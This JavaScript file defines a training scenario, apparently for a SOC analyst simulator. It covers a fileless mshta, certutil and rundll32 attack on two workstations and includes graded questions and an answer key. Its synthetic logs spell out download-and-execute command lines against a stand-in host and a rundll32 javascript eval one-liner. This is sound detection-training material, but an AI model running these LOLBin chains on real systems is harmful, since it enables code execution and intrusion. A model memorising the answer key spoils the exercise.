// E6 · Signed Windows tools behaving oddly: a fileless attack with mshta,
// certutil and rundll32 on two workstations.

import { E } from '../../engine/format.js';
import { account, hostNamed, dom, BINARIES as B } from '../../engine/env.js';
import { defineScenario, ran, single, multi, order, hosts, link } from '../lib.js';

const WS = hostNamed('WS-OPS-004');
const WS2 = hostNamed('WS-OPS-031');
const U = account(WS.owner);
const U2 = account(WS2.owner);
const LOL = 'docview-share.example';
const C2 = '198.51.100.249';

function chain(x, ws, user, base, tags) {
  x.add(tags[0], E.procCreate(x.T(base), ws.name, { user: dom(user.sam), image: 'C:\\Windows\\System32\\mshta.exe', command_line: `mshta.exe http://${LOL}/view.hta`, pid: 4410, parent_image: B.edge.path, ppid: 2010, signature: 'Valid (Microsoft Windows)' }));
  x.add(tags[1], E.procCreate(x.T(base + 5), ws.name, { user: dom(user.sam), image: 'C:\\Windows\\System32\\certutil.exe', command_line: `certutil.exe -urlcache -split -f http://${LOL}/p.txt %TEMP%\\p.txt`, pid: 4420, parent_image: 'C:\\Windows\\System32\\mshta.exe', ppid: 4410, signature: 'Valid (Microsoft Windows)' }));
  x.add(tags[1], E.procCreate(x.T(base + 7), ws.name, { user: dom(user.sam), image: 'C:\\Windows\\System32\\certutil.exe', command_line: 'certutil.exe -decode %TEMP%\\p.txt %TEMP%\\p.js', pid: 4424, parent_image: 'C:\\Windows\\System32\\mshta.exe', ppid: 4410, signature: 'Valid (Microsoft Windows)' }));
  x.add(tags[2], E.procCreate(x.T(base + 10), ws.name, { user: dom(user.sam), image: B.rundll32.path, command_line: 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";eval(new ActiveXObject("Scripting.FileSystemObject").OpenTextFile("%TEMP%\\p.js").ReadAll())', pid: 4430, parent_image: 'C:\\Windows\\System32\\mshta.exe', ppid: 4410, signature: 'Valid (Microsoft Windows)' }));
  for (let t = base + 30; t < Math.min(0, base + 1500); t += 60) x.add(tags[3], E.edr(x.T(t), ws.name, 3, 'NetworkConnect', { user: dom(user.sam), image: B.rundll32.path, pid: 4430, dest_ip: C2, dest_port: 443 }));
}

export default defineScenario({
  code: 'E6', level: 'expert',
  title: 'mshta.exe executed a remote HTA file', rule: 'EDR-0915', severity: 'high', queue: 'endpoint',
  blurb: 'An endpoint rule reports mshta.exe running a remote HTA file.',
  sources: ['edr', 'proxy', 'dns', 'winsec', 'firewall', 'email'], sourceGroups: ['endpoint', 'proxy'],
  skills: ['log.endpoint', 'kno.malware', 'inv.scope', 'inv.search'],
  entities: { domains: [LOL], ips: [C2] },
  history: 90 * 60,
  alertTags: ['mshta'],
  build(x) {
    chain(x, WS2, U2, -62 * 60, ['host2', 'host2', 'host2', 'host2']);
    chain(x, WS, U, -40, ['mshta', 'certutil', 'rundll', 'beacon']);
    x.add('decoy_certutil', E.procCreate(x.T(-30 * 60), 'FS02', { user: dom('adm.rkhan'), image: 'C:\\Windows\\System32\\certutil.exe', command_line: 'certutil.exe -dump C:\\Certs\\server.cer', pid: 2210, parent_image: B.cmd.path, ppid: 2100, signature: 'Valid (Microsoft Windows)' }));
  },
  alert: () => ({
    description: `mshta.exe on ${WS.name} executed http://${LOL}/view.hta.`,
    entity: { host: WS.name, ip: WS.ip, user: U.sam },
    details: [['Host', WS.name], ['Command', `mshta.exe http://${LOL}/view.hta`], ['Parent', 'msedge.exe'], ['Rule logic', 'mshta.exe with a URL argument']],
    guidance: ['Follow the process chain.', 'Hunt for the same pattern on other hosts.'],
  }),
  intel: { [LOL]: { verdict: 'malicious', detections: '6/89', facts: [['Registered', '12 days ago']], notes: ['Hosts HTA droppers.'] }, [C2]: { verdict: 'malicious', detections: '4/89', facts: [], notes: ['Command and control.'] } },
  triage: {
    checks: [{ id: 'ti', label: 'Domain checked in threat intelligence', test: ran('reputation', LOL) }],
    verdict: { accept: 'tp', explain: 'A signed tool loading remote script, then download-and-decode with certutil.' },
    severity: { accept: 'high', explain: 'Active code execution with a callback.' },
    evidence: { tags: ['mshta'], explain: 'The mshta execution.' },
  },
  l2: {
    fields: [
      multi('technique', 'Techniques observed', 8, [['mshta', 'Mshta (T1218.005)'], ['certutil', 'Ingress tool transfer with certutil (T1105)'], ['rundll32', 'Rundll32 (T1218.011)'], ['wmi', 'WMI (T1047)'], ['schtask', 'Scheduled task (T1053.005)']], ['mshta', 'certutil', 'rundll32'], { explain: 'Three built-in tools chained.', skills: ['kno.attack-mapping'] }),
      order('chain', 'Order of the chain', 6, [['mshta', 'mshta'], ['dl', 'certutil download'], ['decode', 'certutil decode'], ['rundll', 'rundll32'], ['c2', 'Callback']], ['mshta', 'dl', 'decode', 'rundll', 'c2'], { skills: ['inv.timeline'] }),
      link(hosts('scope', 'Affected hosts', 10, [WS.name, WS2.name], { hint: 'Hunt the pattern, not just the alert: sweep for the domain.', explain: 'The same chain ran on a second workstation an hour earlier.', skills: ['inv.scope', 'inv.search'] }), 'host2'),
      single('decoy', 'The certutil run on FS02', 4, [['benign', 'Benign: certutil -dump of a certificate'], ['malicious', 'Part of the attack'], ['unknown', 'Unknown']], 'benign', { explain: 'Same tool, different use.', skills: ['tri.false-positive'] }),
    ],
  },
  response: {
    scope: { hosts: [WS.name, WS2.name], domains: [LOL], ips: [C2] },
    contained: (st) => st.offline(WS.name) && st.offline(WS2.name),
    objectives: [
      { id: 'contain', label: 'Isolate both workstations', points: 4, containment: true, eval: (st) => ((st.offline(WS.name) ? 1 : 0) + (st.offline(WS2.name) ? 1 : 0)) / 2, explain: 'Both have an active callback.' },
      { id: 'block', label: 'Block the domain and the C2 address', points: 3, containment: true, eval: (st) => ((st.domainBlocked(LOL) ? 1 : 0) + (st.ipBlocked(C2) ? 1 : 0)) / 2, explain: 'Stops new infections and existing callbacks.' },
      { id: 'sweep', label: 'Sweep the fleet for the domain', points: 3, skills: ['inv.scope'], eval: (st, ctx) => (ctx.case.toolRuns.some((t) => t.tool === 'sweep' && t.input.includes(LOL)) ? 1 : 0), explain: 'The only way to know the scope.' },
    ],
  },
  closure: {
    disposition: { options: [['incident', 'True positive: fileless attack on two hosts'], ['one', 'True positive on one host'], ['fp', 'False positive'], ['admin', 'Admin activity']], accept: 'incident', explain: 'Two hosts.' },
    rootCause: { options: [['link', 'A link to a remote HTA opened in the browser'], ['usb', 'USB'], ['exploit', 'Server exploit'], ['insider', 'Insider']], accept: 'link', explain: 'mshta launched from the browser.' },
    actions: { options: [['detect', 'Add a detection for mshta with a URL argument'], ['policy', 'Review the browser download policy'], ['block_certutil', 'Block certutil on every host']], set: ['detect', 'policy'], explain: 'Blocking a system tool breaks certificate work.', skills: ['doc.root-cause'] },
  },
  truth: { summary: `A fileless attack using built-in tools: mshta ran a remote HTA from ${LOL}, certutil downloaded and decoded a script, and rundll32 ran it in memory with callbacks to ${C2}. The same chain ran on ${WS2.name} an hour earlier. The certutil -dump on FS02 is an administrator reading a certificate.`, timeline: [[-62 * 60, `Chain on ${WS2.name}.`], [-30 * 60, 'Benign certutil on FS02.'], [-40, `Chain on ${WS.name}.`]], iocs: [{ type: 'domain', value: LOL, note: 'HTA host' }, { type: 'ip', value: C2, note: 'C2' }] },
  test: { tools: { l1_triage: [['reputation', LOL]], l2_investigation: [['sweep', LOL]] }, response: [['isolate_host', WS.name], ['isolate_host', WS2.name], ['block_domain', LOL], ['block_ip', C2]] },
});
